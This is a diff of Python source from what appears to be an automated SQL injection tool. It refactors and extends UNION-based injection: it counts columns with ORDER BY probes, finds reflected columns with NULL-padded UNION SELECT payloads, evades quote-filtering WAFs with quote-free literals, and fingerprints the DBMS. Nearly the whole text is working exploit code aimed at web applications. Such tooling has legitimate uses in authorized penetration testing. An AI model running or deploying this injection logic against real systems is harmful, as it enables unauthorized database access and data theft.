@@ -721,44 +721,99 @@ def _union_select() -> str:
     return f"{mix('UNION')}/**/{mix('SELECT')}"
 
 
-def union_setup(http, oracle, dbms, maxcols=15):
-    """Find the column count (ORDER BY) and a reflected column, or None.
-
-    Column count is decided by *relative* similarity, not a fixed cutoff: an
-    out-of-range `ORDER BY n` lands on the DBMS's error page, which on some apps is
-    only a few percent different from a normal page (a single leaked line) — under
-    a 0.95 floor it reads as "valid", so the count overshoots and every UNION probe
-    then fails the column-count match. We compare each `ORDER BY n` against a
-    deliberately-broken `ORDER BY 9999` (a guaranteed error) as well as the base
-    page, and accept n only while it sits closer to the base than to that error.
-
-    The reflected column is then found the textbook way: a single string marker in
-    one position with NULL in the rest, trying each position. NULL is type-
-    compatible with any column, so this survives strict UNION type-checking
-    (Postgres/MSSQL) — putting a string in every column would error there. Markers
-    go in as quote-free literals (see `_strlit`), so a target that filters single
-    quotes still reflects them."""
-    q = _quote_for(oracle.context)
-    base = _inject(http, oracle.url, oracle.param, oracle.value)
-    err = _inject(http, oracle.url, oracle.param, f"{oracle.value}{q} ORDER BY 9999{_COMMENT}")
+def _union_columns_count(http, url, param, value, quote, maxcols=15):
+    """The number of columns the original query selects, decided by *relative*
+    similarity rather than a fixed cutoff: an out-of-range `ORDER BY n` lands on the
+    DBMS's error page, which on some apps is only a few percent different from a normal
+    page (a single leaked line) — under a 0.95 floor it reads as "valid", so the count
+    overshoots and every UNION probe then fails. Each `ORDER BY n` is compared against a
+    deliberately-broken `ORDER BY 9999` as well as the base page, and n accepted only
+    while it sits closer to the base than to that error. Returns 0 when the quote never
+    breaks out (ORDER BY 9999 looks just like the base — it stayed inside the string)."""
+    base = _inject(http, url, param, value)
+    err = _inject(http, url, param, f"{value}{quote} ORDER BY 9999{_COMMENT}")
+    if _sim(base, err) >= 0.99:                  # no breakout in this quote context
+        return 0
     ncols = 0
     for n in range(1, maxcols + 1):
-        r = _inject(http, oracle.url, oracle.param, f"{oracle.value}{q} ORDER BY {n}{_COMMENT}")
+        r = _inject(http, url, param, f"{value}{quote} ORDER BY {n}{_COMMENT}")
         if _sim(r, base) >= _sim(r, err):
             ncols = n
         else:
             break
-    if not ncols:
-        return None
-    umark = _marks_of(oracle).umark
+    return ncols
+
+
+def _union_reflect(http, url, param, value, quote, dbms, ncols, marks):
+    """The 0-based index of a column reflected in the page, or None. A single string
+    marker in one position with NULL in the rest (NULL is type-compatible with any
+    column, so this survives strict UNION typing on Postgres/MSSQL — a string in every
+    column would error there). The marker is a quote-free literal (see `_strlit`), so a
+    quote-filtering WAF still reflects it — and its per-DBMS encoding doubles as a
+    fingerprint: a hex literal renders the string only on MySQL, char()/chr() on the
+    rest."""
     for refcol in range(ncols):
-        mark = f"{umark}{refcol}z"
+        mark = f"{marks.umark}{refcol}z"
         cols = ["NULL"] * ncols
         cols[refcol] = _strlit(dbms, mark)
-        r = _html.unescape(_inject(http, oracle.url, oracle.param,
-                                   f"{oracle.value}{q} AND 1=2 {_union_select()} {','.join(cols)}{_COMMENT}"))
+        r = _html.unescape(_inject(http, url, param,
+                                   f"{value}{quote} AND 1=2 {_union_select()} {','.join(cols)}{_COMMENT}"))
         if mark in r:
-            return ncols, refcol
+            return refcol
+    return None
+
+
+def union_setup(http, oracle, dbms, maxcols=15):
+    """Column count + a reflected column for the oracle's calibrated quote context, or
+    None (see `_union_columns_count` / `_union_reflect`)."""
+    q = _quote_for(oracle.context)
+    ncols = _union_columns_count(http, oracle.url, oracle.param, oracle.value, q, maxcols)
+    if not ncols:
+        return None
+    refcol = _union_reflect(http, oracle.url, oracle.param, oracle.value, q, dbms, ncols,
+                            _marks_of(oracle))
+    return (ncols, refcol) if refcol is not None else None
+
+
+class UnionOracle:
+    """A minimal oracle for the UNION-only path: a target that reflects query output but
+    offers no boolean/error/time differential to calibrate against — e.g. a lookup whose
+    base value matches no row, so a true and a false condition return the same empty page.
+    Carries what the union walk reads from an oracle (url/param/value/marks); it never
+    answers ask()."""
+
+    def __init__(self, http, url, param, value, context="numeric", console=None):
+        self.http, self.url, self.param, self.value = http, url, param, value
+        self.context = context
+        self.console = console
+        self.cache = None
+        self.marks = _new_marks()
+        self.blocked = 0
+
+    @property
+    def count(self):
+        return self.http.count
+
+
+def union_calibrate(http, url, param, value, maxcols=15, console=None):
+    """Find a UNION injection without a boolean oracle: try each quote context, count
+    columns by ORDER BY, then look for a reflected column. The reflecting column's
+    quote-free encoding fingerprints the DBMS — MySQL is tried first because its hex
+    literal renders only there, so the char()/chr() forms that follow can't be mistaken
+    for it. For a reflected target with no true/false differential (a lookup that matches
+    no row), this catches the UNION a boolean-first flow misses. Returns
+    (UnionOracle, dbms, ncols, refcol) or None."""
+    o = UnionOracle(http, url, param, value, console=console)
+    for quote, context in (("", "numeric"), ('"', "double-quote"),
+                           ("'", "single-quote"), ("')", "paren-single")):
+        ncols = _union_columns_count(http, url, param, value, quote, maxcols)
+        if not ncols:
+            continue
+        for dbms in ("mysql", "sqlite", "postgres", "mssql"):
+            refcol = _union_reflect(http, url, param, value, quote, dbms, ncols, o.marks)
+            if refcol is not None:
+                o.context = context
+                return o, dbms, ncols, refcol
     return None
 
 
